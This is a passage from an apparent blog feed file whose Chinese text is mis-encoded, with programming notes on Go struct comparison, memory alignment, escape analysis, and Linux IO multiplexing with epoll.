class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>å‚è€ƒèµ„æ–™<br><a href="https://songjiayang.gitbooks.io/go-basic-courses/content/ch7/channel.html">https://songjiayang.gitbooks.io/go-basic-courses/content/ch7/channel.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>goä¸¤ä¸ªstructå®ä¾‹èƒ½å¦æ¯”è¾ƒ</title>
      <link href="/2022/05/12/go%E4%B8%A4%E4%B8%AAstruct%E5%AE%9E%E4%BE%8B%E8%83%BD%E5%90%A6%E6%AF%94%E8%BE%83/"/>
      <url>/2022/05/12/go%E4%B8%A4%E4%B8%AAstruct%E5%AE%9E%E4%BE%8B%E8%83%BD%E5%90%A6%E6%AF%94%E8%BE%83/</url>
      
        <content type="html"><![CDATA[<h2 id="åŒä¸€ä¸ªstructçš„2ä¸ªå®ä¾‹èƒ½ä¸èƒ½ç”¨-æˆ–è€…-æ¯”è¾ƒ"><a href="#åŒä¸€ä¸ªstructçš„2ä¸ªå®ä¾‹èƒ½ä¸èƒ½ç”¨-æˆ–è€…-æ¯”è¾ƒ" class="headerlink" title="åŒä¸€ä¸ªstructçš„2ä¸ªå®ä¾‹èƒ½ä¸èƒ½ç”¨==  æˆ–è€… !=æ¯”è¾ƒ"></a>åŒä¸€ä¸ªstructçš„2ä¸ªå®ä¾‹èƒ½ä¸èƒ½ç”¨==  æˆ–è€… !=æ¯”è¾ƒ</h2><p>å¯ä»¥æ¯”è¾ƒçš„æƒ…å†µï¼š<br>1ã€‚ç»“æ„ä½“å½“ä¸­æ²¡æœ‰ä¸å¯æ¯”è¾ƒçš„ç±»å‹ï¼Œæ¯”å¦‚sliceå’Œmap<br>2ï¼Œå¿…é¡»å¾—æ˜¯åŒä¸€ä¸ªç»“æ„ä½“çš„å®ä¾‹<br>å¦‚æœæœ‰ä¸å¯æ¯”è¾ƒçš„ç±»å‹çš„è¯ï¼Œç”¨reflect.DeepEqual(,),å¦‚æœæ˜¯ç›¸åŒç±»å‹å¹¶ä¸”å€¼éƒ½ä¸€æ ·åˆ™trueï¼Œå¦‚æœæ˜¯ä¸åŒç±»å‹ç›´æ¥falseã€‚</p>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>goå†…å­˜å¯¹é½</title>
      <link href="/2022/05/12/go%E5%86%85%E5%AD%98%E5%AF%B9%E9%BD%90/"/>
      <url>/2022/05/12/go%E5%86%85%E5%AD%98%E5%AF%B9%E9%BD%90/</url>
      
        <content type="html"><![CDATA[<h2 id="å­—é•¿ï¼ˆword-sizeï¼‰"><a href="#å­—é•¿ï¼ˆword-sizeï¼‰" class="headerlink" title="å­—é•¿ï¼ˆword sizeï¼‰"></a>å­—é•¿ï¼ˆword sizeï¼‰</h2><p>å­—é•¿ï¼ˆword sizeï¼‰ï¼ŒæŒ‡çš„æ˜¯ CPU ä¸€æ¬¡å¯ä»¥è®¿é—®æ•°æ®çš„æœ€å¤§é•¿åº¦ï¼š</p><ul><li>å¯¹äº 32 ä½çš„ cpu æ¥è¯´ï¼šword size ä¸º 2^32ï¼Œå³ 4 byte</li><li>å¯¹äº 64 ä½çš„ cpu æ¥è¯´ï¼šword size ä¸º 2^64ï¼Œå³ 8 byte</li></ul><h2 id="ä¸¤ç§å†…å­˜å¸ƒå±€"><a href="#ä¸¤ç§å†…å­˜å¸ƒå±€" class="headerlink" title="ä¸¤ç§å†…å­˜å¸ƒå±€"></a>ä¸¤ç§å†…å­˜å¸ƒå±€</h2><p>ä¸‹è¾¹æ˜¯ä¸€ä¸ªç»“æ„ä½“çš„ä¸¤ç§å†…å­˜å¸ƒå±€æ–¹å¼</p><h3 id="ç¬¬ä¸€ç§ï¼šæŒ‰é¡ºåº"><a href="#ç¬¬ä¸€ç§ï¼šæŒ‰é¡ºåº" class="headerlink" title="ç¬¬ä¸€ç§ï¼šæŒ‰é¡ºåº"></a>ç¬¬ä¸€ç§ï¼šæŒ‰é¡ºåº</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Foo <span class="keyword">struct</span> &#123;</span><br><span class="line">    A <span class="keyword">int8</span> <span class="comment">// 1</span></span><br><span class="line">    B <span class="keyword">int8</span> <span class="comment">// 1</span></span><br><span class="line">    C <span class="keyword">int8</span> <span class="comment">// 1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Bar <span class="keyword">struct</span> &#123;</span><br><span class="line">    x <span class="keyword">int32</span> <span class="comment">// 4</span></span><br><span class="line">    y *Foo  <span class="comment">// 8</span></span><br><span class="line">    z <span class="keyword">bool</span>  <span class="comment">// 1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä½ è§‰å¾— Bar å¯¹è±¡ä¼šå ç”¨å¤šå°‘çš„å†…å­˜ï¼Ÿ å¯èƒ½å¾ˆå¤šäººä¼šä¸‹æ„è¯†åœ°å›ç­” <strong>13</strong><br>ä¼šå›ç­” 13 æ˜¯å› ä¸ºä½ è§‰å¾—è¯¥ç»“æ„ä½“çš„å†…å­˜åˆ†é…æ˜¯ä¸‹é¢è¿™æ ·æŒ‰é¡ºåˆ©åˆ†é…çš„ã€‚<br>æŒ‰ç…§å‰é¢æ‰€ä»‹ç»çš„ word size ä¸º 8 æ¥è®¡ç®—ï¼Œä½¿ç”¨è¿™ç§åˆ†é…æ–¹å¼ï¼Œå½“ä½ è®¿é—® bar.y çš„æ—¶å€™ï¼ŒCPU éœ€è¦è®¿é—®å†…å­˜ä¸¤æ¬¡ã€‚<br><img src="https://snowgo.top/medias/medias/go%E5%86%85%E5%AD%98%E5%AF%B9%E9%BD%90/4.png"></p><h3 id="ç¬¬äºŒç§ï¼šæŒ‰å­—é•¿"><a href="#ç¬¬äºŒç§ï¼šæŒ‰å­—é•¿" class="headerlink" title="ç¬¬äºŒç§ï¼šæŒ‰å­—é•¿"></a>ç¬¬äºŒç§ï¼šæŒ‰å­—é•¿</h3><p>è€Œå¦‚æœä½¿ç”¨ä¸‹é¢è¿™ç§æ–¹å¼ï¼Œå½“ä½ å†æ¬¡è®¿é—® bar.y çš„æ—¶å€™ï¼ŒCPU éœ€è¦è®¿é—®å†…å­˜ä¸€æ¬¡ã€‚<br><img src="https://snowgo.top/medias/medias/go%E5%86%85%E5%AD%98%E5%AF%B9%E9%BD%90/5.png"><br>å› æ­¤çœŸæ­£çš„ç­”æ¡ˆæ˜¯ <strong>24</strong>ï¼Œè¿™æ˜¯ä¸€ç§å…¸å‹çš„ç”¨ç©ºé—´æ¢æ—¶é—´çš„æ–¹æ³• â€” <strong>å†…å­˜å¯¹é½</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> bar Bar</span><br><span class="line">    fmt.Println(unsafe.Sizeof(bar))  <span class="comment">// 24</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="åˆç†å®šä¹‰ç»“æ„ä½“"><a href="#åˆç†å®šä¹‰ç»“æ„ä½“" class="headerlink" title="åˆç†å®šä¹‰ç»“æ„ä½“"></a>åˆç†å®šä¹‰ç»“æ„ä½“</h2><h3 id="å¯¹é½åŸåˆ™"><a href="#å¯¹é½åŸåˆ™" class="headerlink" title="å¯¹é½åŸåˆ™"></a>å¯¹é½åŸåˆ™</h3><ol><li>æ¯ä¸ªæˆå‘˜å˜é‡çš„å¯¹é½å€¼æ˜¯æ“ä½œç³»ç»Ÿçš„é»˜è®¤å¯¹é½é•¿åº¦å’Œæˆå‘˜å˜é‡é•¿åº¦å–æœ€å°å€¼ï¼Œåç§»é‡å¿…é¡»æ˜¯å¯¹é½å€¼çš„æ•´æ•°å€ï¼ˆé»˜è®¤å¯¹é½æ•°å¯ä»¥æ”¹ï¼Œæ¯”å¦‚å¯ä»¥æ”¹æˆ1ï¼Œä½†æ˜¯ä¸å»ºè®®è¿™ä¹ˆåšï¼‰</li><li>æ•´ä¸ªç»“æ„ä½“çš„åœ°å€å¿…é¡»æ˜¯æˆå‘˜å˜é‡æœ€å¤§å­—èŠ‚çš„æ•´æ•°å€(ç»“æ„ä½“çš„å†…å­˜å ç”¨æ˜¯1/4/8/16byteâ€¦)</li></ol><p>ä»ä»¥ä¸Šå¯ä»¥å‘ç°ï¼Œæˆ‘ä»¬å®šä¹‰çš„ç»“æ„ä½“è™½ç„¶ä¸å¤§ï¼Œåªå ç”¨ 24ä¸ªbyteï¼Œä½†å®é™…æœ‰ç”¨çš„åªæœ‰ 13 çš„byteï¼Œå†…å­˜ä½¿ç”¨ç‡åªæœ‰ 50% å·¦å³ï¼Œå¾ˆæœ‰ä¼˜åŒ–çš„å¿…è¦æ€§ã€‚<br>å¦‚æœå°†ç¬¬ä¸‰ä¸ªå±æ€§æŒª y çš„å‰é¢<br><img src="https://snowgo.top/medias/medias/go%E5%86%85%E5%AD%98%E5%AF%B9%E9%BD%90/6.png"><br>é‚£å°±å¯ä»¥çœä¸‹æ¥ 1 ä¸ª byte äº†,<strong>è¿™é‡Œä½“ç°äº†ç¬¬ä¸€æ¡åŸåˆ™</strong><br>å¯ä»¥ä½¿ç”¨unsafe.Sizeof()æŸ¥çœ‹å¯¹é½ç³»æ•°</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> bar Bar</span><br><span class="line">    fmt.Println(unsafe.Sizeof(bar))  <span class="comment">// 16</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>ä¸‹é¢ä½“ç°äº†ç¬¬äºŒæ¡åŸåˆ™</strong><br><img src="https://snowgo.top/medias/medias/go%E5%86%85%E5%AD%98%E5%AF%B9%E9%BD%90/7.png"></p>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Goè¯­è¨€ä¸­çš„å†…å­˜é€ƒé€¸ç°è±¡</title>
      <link href="/2022/05/10/Go%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84%E5%86%85%E5%AD%98%E9%80%83%E9%80%B8%E7%8E%B0%E8%B1%A1/"/>
      <url>/2022/05/10/Go%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84%E5%86%85%E5%AD%98%E9%80%83%E9%80%B8%E7%8E%B0%E8%B1%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="å†…å­˜é€ƒé€¸æ˜¯å¹²ä»€ä¹ˆçš„"><a href="#å†…å­˜é€ƒé€¸æ˜¯å¹²ä»€ä¹ˆçš„" class="headerlink" title="å†…å­˜é€ƒé€¸æ˜¯å¹²ä»€ä¹ˆçš„"></a>å†…å­˜é€ƒé€¸æ˜¯å¹²ä»€ä¹ˆçš„</h2><p>å†…å­˜é€ƒé€¸åˆ†ææŒ‡çš„æ˜¯ç¼–è¯‘å™¨åœ¨ç¼–è¯‘ä¼˜åŒ–æ—¶æ¥å†³å®šå˜é‡åº”è¯¥åˆ†é…åœ¨å †ä¸Šè¿˜æ˜¯æ ˆä¸Šã€‚</p><h2 id="ä¸ºä»€ä¹ˆè¦å°½é‡é¿å…å†…å­˜é€ƒé€¸"><a href="#ä¸ºä»€ä¹ˆè¦å°½é‡é¿å…å†…å­˜é€ƒé€¸" class="headerlink" title="ä¸ºä»€ä¹ˆè¦å°½é‡é¿å…å†…å­˜é€ƒé€¸"></a>ä¸ºä»€ä¹ˆè¦å°½é‡é¿å…å†…å­˜é€ƒé€¸</h2><p>å› ä¸ºå¦‚æœå˜é‡çš„å†…å­˜å‘ç”Ÿé€ƒé€¸ï¼Œå®ƒçš„ç”Ÿå‘½å‘¨æœŸå°±æ˜¯ä¸å¯çŸ¥çš„ï¼Œå…¶ä¼šè¢«åˆ†é…åˆ°å †ä¸Šï¼Œè€Œå †ä¸Šåˆ†é…å†…å­˜ä¸èƒ½åƒæ ˆä¸€æ ·ä¼šè‡ªåŠ¨é‡Šæ”¾ï¼Œä¸ºäº†è§£æ”¾ç¨‹åºå‘˜åŒæ‰‹ï¼Œä¸“æ³¨äºä¸šåŠ¡çš„å®ç°ï¼Œgoå®ç°äº†gcåƒåœ¾å›æ”¶æœºåˆ¶ï¼Œä½†gcä¼šå½±å“ç¨‹åºè¿è¡Œæ€§èƒ½ï¼Œæ‰€ä»¥è¦å°½é‡å‡å°‘ç¨‹åºçš„gcæ“ä½œã€‚</p><h2 id="å¼•å‘å†…å­˜é€ƒé€¸çš„å¸¸è§æƒ…å†µ"><a href="#å¼•å‘å†…å­˜é€ƒé€¸çš„å¸¸è§æƒ…å†µ" class="headerlink" title="å¼•å‘å†…å­˜é€ƒé€¸çš„å¸¸è§æƒ…å†µ"></a>å¼•å‘å†…å­˜é€ƒé€¸çš„å¸¸è§æƒ…å†µ</h2><ol><li>åœ¨æ–¹æ³•å†…æŠŠå±€éƒ¨å˜é‡æŒ‡é’ˆè¿”å›ï¼Œè¢«å¤–éƒ¨å¼•ç”¨ï¼Œå…¶ç”Ÿå‘½å‘¨æœŸå¤§äºæ ˆï¼Œåˆ™æº¢å‡ºã€‚</li><li>å‘é€æŒ‡é’ˆæˆ–å¸¦æœ‰æŒ‡é’ˆçš„å€¼åˆ°channelï¼Œå› ä¸ºç¼–è¯‘æ—¶å€™æ— æ³•çŸ¥é“å“ªä¸ªgoroutineä¼šåœ¨channelæ¥æ”¶æ•°æ®ï¼Œç¼–è¯‘å™¨æ— æ³•çŸ¥é“ä»€ä¹ˆæ—¶å€™é‡Šæ”¾ã€‚</li><li>åœ¨ä¸€ä¸ªåˆ‡ç‰‡ä¸Šå­˜å‚¨æŒ‡é’ˆæˆ–å¸¦æŒ‡é’ˆçš„å€¼ã€‚æ¯”å¦‚[]*stringï¼Œå¯¼è‡´åˆ‡ç‰‡å†…å®¹é€ƒé€¸ï¼Œå…¶å¼•ç”¨å€¼ä¸€ç›´åœ¨å †ä¸Šã€‚</li><li>å› ä¸ºåˆ‡ç‰‡çš„appendå¯¼è‡´è¶…å‡ºå®¹é‡ï¼Œåˆ‡ç‰‡é‡æ–°åˆ†é…åœ°å€ï¼Œåˆ‡ç‰‡èƒŒåçš„å­˜å‚¨åŸºäºè¿è¡Œæ—¶çš„æ•°æ®è¿›è¡Œæ‰©å……ï¼Œå°±ä¼šåœ¨å †ä¸Šåˆ†é…ã€‚</li><li>åœ¨interfaceç±»å‹ä¸Šè°ƒç”¨æ–¹æ³•ï¼Œåœ¨Interfaceè°ƒç”¨æ–¹æ³•æ˜¯åŠ¨æ€è°ƒåº¦çš„ï¼Œåªæœ‰åœ¨è¿è¡Œæ—¶æ‰çŸ¥é“ã€‚</li></ol><h2 id="å¦‚ä½•é¿å…å†…å­˜é€ƒé€¸"><a href="#å¦‚ä½•é¿å…å†…å­˜é€ƒé€¸" class="headerlink" title="å¦‚ä½•é¿å…å†…å­˜é€ƒé€¸"></a>å¦‚ä½•é¿å…å†…å­˜é€ƒé€¸</h2><ol><li>ä¸è¦ç›²ç›®ä½¿ç”¨å˜é‡æŒ‡é’ˆä½œä¸ºå‚æ•°ï¼Œè™½ç„¶å‡å°‘äº†å¤åˆ¶ï¼Œä½†å˜é‡é€ƒé€¸çš„å¼€é”€æ›´å¤§ã€‚</li><li>é¢„å…ˆè®¾å®šå¥½sliceé•¿åº¦ï¼Œé¿å…é¢‘ç¹è¶…å‡ºå®¹é‡ï¼Œé‡æ–°åˆ†é…ã€‚</li><li>ä¸€ä¸ªç»éªŒæ˜¯ï¼ŒæŒ‡é’ˆæŒ‡å‘çš„æ•°æ®å¤§éƒ¨åˆ†åœ¨å †ä¸Šåˆ†é…çš„ï¼Œè¯·æ³¨æ„ã€‚</li></ol>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linuxä¹‹ioå¤šè·¯å¤ç”¨ä¸epoll</title>
      <link href="/2022/05/09/linux%E4%B9%8Bio%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E4%B8%8Eepoll/"/>
      <url>/2022/05/09/linux%E4%B9%8Bio%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E4%B8%8Eepoll/</url>
      
        <content type="html"><![CDATA[<h2 id="IO-å¤šè·¯å¤ç”¨æ¦‚è¿°"><a href="#IO-å¤šè·¯å¤ç”¨æ¦‚è¿°" class="headerlink" title="IO å¤šè·¯å¤ç”¨æ¦‚è¿°"></a>IO å¤šè·¯å¤ç”¨æ¦‚è¿°</h2><p>I/O å¤šè·¯å¤ç”¨æŠ€æœ¯æ˜¯ä¸ºäº†è§£å†³è¿›ç¨‹æˆ–çº¿ç¨‹é˜»å¡åˆ°æŸä¸ª I/O ç³»ç»Ÿè°ƒç”¨è€Œå‡ºç°çš„æŠ€æœ¯ï¼Œä½¿è¿›ç¨‹ä¸é˜»å¡äºæŸä¸ªç‰¹å®šçš„ I/O ç³»ç»Ÿè°ƒç”¨ã€‚<br>åœ¨IOå¤šè·¯å¤ç”¨æŠ€æœ¯æè¿°å‰ï¼Œå…ˆè®²è§£ä¸‹åŒæ­¥ï¼Œå¼‚æ­¥ï¼Œé˜»å¡ï¼Œéé˜»å¡çš„æ¦‚å¿µã€‚</p><h2 id="ç½‘ç»œIOæ¨¡å‹"><a href="#ç½‘ç»œIOæ¨¡å‹" class="headerlink" title="ç½‘ç»œIOæ¨¡å‹"></a>ç½‘ç»œIOæ¨¡å‹</h2><p>linuxç½‘ç»œIOä¸­æ¶‰åŠåˆ°çš„æ¨¡å‹å¦‚ä¸‹ï¼š<br>ï¼ˆ1ï¼‰é˜»å¡å¼IO<br>ï¼ˆ2ï¼‰éé˜»å¡å¼IO<br>ï¼ˆ3ï¼‰IOå¤šè·¯å¤ç”¨<br>ï¼ˆ4ï¼‰ä¿¡å·é©±åŠ¨IO<br>ï¼ˆ5ï¼‰å¼‚æ­¥IO<br>ä»Šå¤©ä¸è°ˆä¿¡å·é©±åŠ¨IOï¼Œç•¥è¿‡..</p><h2 id="åŒæ­¥-å¼‚æ­¥"><a href="#åŒæ­¥-å¼‚æ­¥" class="headerlink" title="åŒæ­¥/å¼‚æ­¥"></a>åŒæ­¥/å¼‚æ­¥</h2><p>åœ¨å­¦ä¹ IOæ¨¡å‹çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¿…é¡»æ˜ç¡®ä¸€ä¸ªæ¦‚å¿µï¼Œå¤„ç† IO çš„æ—¶å€™ï¼Œé˜»å¡å’Œéé˜»å¡éƒ½æ˜¯åŒæ­¥çš„ IOã€‚<br>åªæœ‰ä½¿ç”¨äº†ç‰¹æ®Šçš„ API æ‰æ˜¯å¼‚æ­¥ IOï¼Œä¾‹å¦‚Linuxç½‘ç»œä¸­çš„AIOã€‚</p><p><img src="https://snowgo.top/medias/medias/linux%E4%B9%8Bio%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E4%B8%8Eepoll/0.png"></p><p>å†çœ‹ä¸‹POSIXå¯¹åŒæ­¥å’Œå¼‚æ­¥è¿™ä¸¤ä¸ªæœ¯è¯­çš„å®šä¹‰:</p><ul><li>åŒæ­¥IOæ“ä½œï¼šå¯¼è‡´è¯·æ±‚è¿›ç¨‹é˜»å¡ï¼Œç›´åˆ°I/Oæ“ä½œå®Œæˆï¼›</li><li>å¼‚æ­¥IOæ“ä½œï¼šä¸å¯¼è‡´è¯·æ±‚è¿›ç¨‹é˜»å¡ï¼›</li></ul><p>é€šä¿—çš„ç†è§£å°±æ˜¯åŒæ­¥å’Œå¼‚æ­¥</p><ul><li>åŒæ­¥ï¼šå½“æ‰§è¡Œç³»ç»Ÿè°ƒç”¨readæ—¶ï¼Œéœ€è¦ç”¨æˆ·ç­‰å¾…å†…æ ¸å®Œæˆä»å†…æ ¸ç¼“å†²åŒºåˆ°ç”¨æˆ·ç¼“å†²åŒºçš„æ•°æ®æ‹·è´ã€‚</li><li>å¼‚æ­¥ï¼šå½“æ‰§è¡Œå¼‚æ­¥IOæ“ä½œä¾‹å¦‚aio_readæ—¶ï¼Œç”¨æˆ·ä¸éœ€è¦ç­‰å¾…ï¼Œåªéœ€è¦æ¥æ”¶å†…æ ¸å®Œæˆæ“ä½œçš„é€šçŸ¥ï¼Œç”±å†…æ ¸æ¥å®Œæˆæ•°æ®çš„è¯»å–ã€‚<h2 id="é˜»å¡-éé˜»å¡"><a href="#é˜»å¡-éé˜»å¡" class="headerlink" title="é˜»å¡/éé˜»å¡"></a>é˜»å¡/éé˜»å¡</h2>åœ¨çŸ¥æ™“é˜»å¡å’Œéé˜»å¡éƒ½æ˜¯åŒæ­¥ IOåï¼Œé˜»å¡å’Œéé˜»å¡å°±å¾ˆå¥½ç†è§£äº†<br>é˜»å¡IOï¼šç”±ç³»ç»Ÿè°ƒç”¨read,å¯¼è‡´çº¿ç¨‹ä¸€ç›´ç­‰å¾…æ•°æ®è¿”å›ã€‚<br>éé˜»å¡IOï¼šç³»ç»Ÿè°ƒç”¨readåç«‹å³è¿”å›ä¸€ä¸ªçŠ¶æ€ï¼Œå½“æ•°æ®è¾¾åˆ°å†…æ ¸ç¼“å†²åŒºä¹‹å‰éƒ½æ˜¯éé˜»å¡çš„ï¼Œå³è¿”å›ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨çŠ¶æ€ã€‚</li></ul><h2 id="IOå¤šè·¯å¤ç”¨"><a href="#IOå¤šè·¯å¤ç”¨" class="headerlink" title="IOå¤šè·¯å¤ç”¨"></a>IOå¤šè·¯å¤ç”¨</h2><p>IOå¤šè·¯å¤ç”¨æ˜¯ä¸€ç§åŒæ­¥IOæ¨¡å‹ï¼Œå®ç°ä¸€ä¸ªçº¿ç¨‹å¯ä»¥ç›‘è§†å¤šä¸ªæ–‡ä»¶å¥æŸ„ï¼›</p><p>å‡è®¾ä½ æ˜¯ä¸€ä¸ªæœºåœºçš„ç©ºç®¡ï¼Œ ä½ éœ€è¦ç®¡ç†åˆ°ä½ æœºåœºçš„æ‰€æœ‰çš„èˆªçº¿ï¼Œ åŒ…æ‹¬è¿›æ¸¯ï¼Œå‡ºæ¸¯ï¼Œ æœ‰äº›èˆªç­éœ€è¦æ”¾åˆ°åœæœºåªç­‰å¾…ï¼Œæœ‰äº›èˆªç­éœ€è¦å»ç™»æœºå£æ¥ä¹˜å®¢ã€‚<br>ä½ ä¼šæ€ä¹ˆåš?<br>æœ€ç®€å•çš„åšæ³•ï¼Œå°±æ˜¯ä½ å»æ‹›ä¸€å¤§æ‰¹ç©ºç®¡å‘˜ï¼Œç„¶åæ¯äººç›¯ä¸€æ¶é£æœºï¼Œ ä»è¿›æ¸¯ï¼Œæ¥å®¢ï¼Œæ’ä½ï¼Œå‡ºæ¸¯ï¼Œèˆªçº¿ç›‘æ§ï¼Œç›´è‡³äº¤æ¥ç»™ä¸‹ä¸€ä¸ªç©ºæ¸¯ï¼Œå…¨ç¨‹ç›‘æ§ã€‚<br>é‚£ä¹ˆé—®é¢˜å°±æ¥äº†ï¼š </p><ul><li><p>å¾ˆå¿«ä½ å°±å‘ç°ç©ºç®¡å¡”é‡Œé¢èšé›†èµ·æ¥ä¸€å¤§ç¥¨çš„ç©ºç®¡å‘˜ï¼Œäº¤é€šç¨å¾®ç¹å¿™ä¸€ç‚¹ï¼Œæ–°çš„ç©ºç®¡å‘˜å°±å·²ç»æŒ¤ä¸è¿›æ¥äº†ã€‚ </p></li><li><p>ç©ºç®¡å‘˜ä¹‹é—´éœ€è¦åè°ƒï¼Œå±‹å­é‡Œé¢å°±1, 2ä¸ªäººçš„æ—¶å€™è¿˜å¥½ï¼Œå‡ åå·äººä»¥å ï¼ŒåŸºæœ¬ä¸Šå°±æˆèœå¸‚åœºäº†ã€‚</p></li><li><p>ç©ºç®¡å‘˜ç»å¸¸éœ€è¦æ›´æ–°ä¸€äº›å…¬ç”¨çš„ä¸œè¥¿ï¼Œæ¯”å¦‚èµ·é£æ˜¾ç¤ºå±ï¼Œæ¯”å¦‚ä¸‹ä¸€ä¸ªå°æ—¶åçš„å‡ºæ¸¯æ’æœŸï¼Œæœ€åä½ ä¼šå¾ˆæƒŠå¥‡çš„å‘ç°ï¼Œæ¯ä¸ªäººçš„æ—¶é—´æœ€åéƒ½èŠ±åœ¨äº†æŠ¢è¿™äº›èµ„æºä¸Šã€‚ </p></li></ul><p>ç°å®ä¸Šæˆ‘ä»¬çš„ç©ºç®¡åŒæ—¶ç®¡å‡ åæ¶é£æœºç¨€æ¾å¹³å¸¸çš„äº‹æƒ…ï¼Œ ä»–ä»¬æ€ä¹ˆåšçš„å‘¢ï¼Ÿ<br>ä»–ä»¬ç”¨è¿™ä¸ªä¸œè¥¿<br><img src="https://snowgo.top/medias/medias/linux%E4%B9%8Bio%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E4%B8%8Eepoll/1.png"><br>è¿™ä¸ªä¸œè¥¿å«flight progress strip. æ¯ä¸€ä¸ªå—ä»£è¡¨ä¸€ä¸ªèˆªç­ï¼Œä¸åŒçš„æ§½ä»£è¡¨ä¸åŒçš„çŠ¶æ€ï¼Œç„¶åä¸€ä¸ªç©ºç®¡å‘˜å¯ä»¥ç®¡ç†ä¸€ç»„è¿™æ ·çš„å—ï¼ˆä¸€ç»„èˆªç­ï¼‰ï¼Œè€Œä»–çš„å·¥ä½œï¼Œå°±æ˜¯åœ¨èˆªç­ä¿¡æ¯æœ‰æ–°çš„æ›´æ–°çš„æ—¶å€™ï¼ŒæŠŠå¯¹åº”çš„å—æ”¾åˆ°ä¸åŒçš„æ§½å­é‡Œé¢ã€‚<br><em>è¿™ä¸ªä¸œè¥¿ç°åœ¨è¿˜æ²¡æœ‰æ·˜æ±°å“¦ï¼Œåªæ˜¯å˜æˆç”µå­çš„äº†è€Œå·²ã€‚ã€‚</em><br>æ˜¯ä¸æ˜¯è§‰å¾—ä¸€ä¸‹å­æ•ˆç‡é«˜äº†å¾ˆå¤šï¼Œä¸€ä¸ªç©ºç®¡å¡”é‡Œå¯ä»¥è°ƒåº¦çš„èˆªçº¿å¯ä»¥æ˜¯å‰ä¸€ç§æ–¹æ³•çš„å‡ å€åˆ°å‡ åå€ã€‚<br>å¦‚æœä½ æŠŠæ¯ä¸€ä¸ªèˆªçº¿å½“æˆä¸€ä¸ªSock(I/O æµ), ç©ºç®¡å½“æˆä½ çš„æœåŠ¡ç«¯Sockç®¡ç†ä»£ç çš„è¯.<br><strong>ç¬¬ä¸€ç§æ–¹æ³•å°±æ˜¯æœ€ä¼ ç»Ÿçš„å¤šè¿›ç¨‹å¹¶å‘æ¨¡å‹ (æ¯è¿›æ¥ä¸€ä¸ªæ–°çš„I/Oæµä¼šåˆ†é…ä¸€ä¸ªæ–°çš„è¿›ç¨‹ç®¡ç†ã€‚)</strong><br><strong>ç¬¬äºŒç§æ–¹æ³•å°±æ˜¯I/O</strong><a href="https://www.zhihu.com/search?q=%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:55772739%7D">å¤šè·¯å¤ç”¨</a>** (å•ä¸ªçº¿ç¨‹ï¼Œé€šè¿‡è®°å½•è·Ÿè¸ªæ¯ä¸ªI/Oæµ(sock)çš„çŠ¶æ€ï¼Œæ¥åŒæ—¶ç®¡ç†å¤šä¸ªI/Oæµ ã€‚)**<br>_å…¶å®â€œI/Oå¤šè·¯å¤ç”¨â€è¿™ä¸ªå‘çˆ¹ç¿»è¯‘å¯èƒ½æ˜¯è¿™ä¸ªæ¦‚å¿µåœ¨ä¸­æ–‡é‡Œé¢å¦‚æ­¤éš¾ç†è§£çš„åŸå› ã€‚æ‰€è°“çš„I/Oå¤šè·¯å¤ç”¨åœ¨è‹±æ–‡ä¸­å…¶å®å« I/O multiplexing. å¦‚æœä½ æœç´¢multiplexingå•¥æ„æ€ï¼ŒåŸºæœ¬ä¸Šéƒ½ä¼šå‡ºè¿™ä¸ªå›¾ï¼š </p><p>_<br><img src="https://snowgo.top/medias/medias/linux%E4%B9%8Bio%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E4%B8%8Eepoll/2.png"><br>_äºæ˜¯å¤§éƒ¨åˆ†äººéƒ½ç›´æ¥è”æƒ³åˆ°â€ä¸€æ ¹ç½‘çº¿ï¼Œå¤šä¸ªsockå¤ç”¨â€ 